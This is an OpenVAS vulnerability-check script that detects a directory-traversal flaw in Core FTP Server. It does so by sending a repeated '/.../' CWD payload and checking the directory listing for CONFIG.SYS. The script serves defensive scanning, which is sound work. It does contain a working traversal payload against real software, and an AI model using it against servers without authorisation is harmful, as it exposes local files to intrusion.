###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_core_ftp_server_40422.nasl 8338 2018-01-09 08:00:38Z teissa $
#
# Core FTP Server Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Core FTP Server is prone to a directory-traversal vulnerability
because the application fails to sufficiently sanitize user-
supplied input.

Exploiting this issue will allow an attacker to view arbitrary local
files within the context of the webserver. Information harvested may
aid in launching further attacks.

Core FTP Server 1.0.343 is vulnerable; other versions may also
be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100660");
 script_version("$Revision: 8338 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-09 09:00:38 +0100 (Tue, 09 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-05-31 18:31:53 +0200 (Mon, 31 May 2010)");
 script_bugtraq_id(40422);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("Core FTP Server Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/40422");
 script_xref(name : "URL" , value : "http://www.coreftp.com/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("FTP");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl","secpod_ftp_anonymous.nasl","ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("ftp_func.inc");

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

if(get_kb_item('ftp/'+ftpPort+'/broken'))exit(0);

if(!get_port_state(ftpPort)){
  exit(0);
}

banner = get_ftp_banner(port:ftpPort);
if(!banner || "Core FTP" >!< banner)exit(0);

soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

domain = get_kb_item("Settings/third_party_domain");
if(isnull(domain)) {
 domain = this_host_name();;
}    

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if(!user)user = "anonymous";
if(!pass)pass = string("openvas@", domain);;

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);

if(login_details)
{
  ftpPort2 = ftp_get_pasv_port(socket:soc1);
  if(ftpPort2)
  {
    soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
    if(soc2) {
      send(socket:soc1, data: string("CWD /.../.../.../.../.../.../.../.../.../.../.../.../.../.../.../...\r\n"));
      result = ftp_recv_line(socket:soc1);
      if("250 CWD command successful" >!< result)exit(0);
      send(socket:soc1, data: string("LIST\r\n"));
      result = ftp_recv_data(socket:soc2);
      close(soc2);
      ftp_close(socket:soc1);
      close(soc1);
    }
  }

  if(result && "CONFIG.SYS" >< result) {
   security_message(port:ftpPort);
   exit(0);
  }
 exit(0);
}

ftp_close(socket:soc1);
close(soc1);

exit(0); 

     
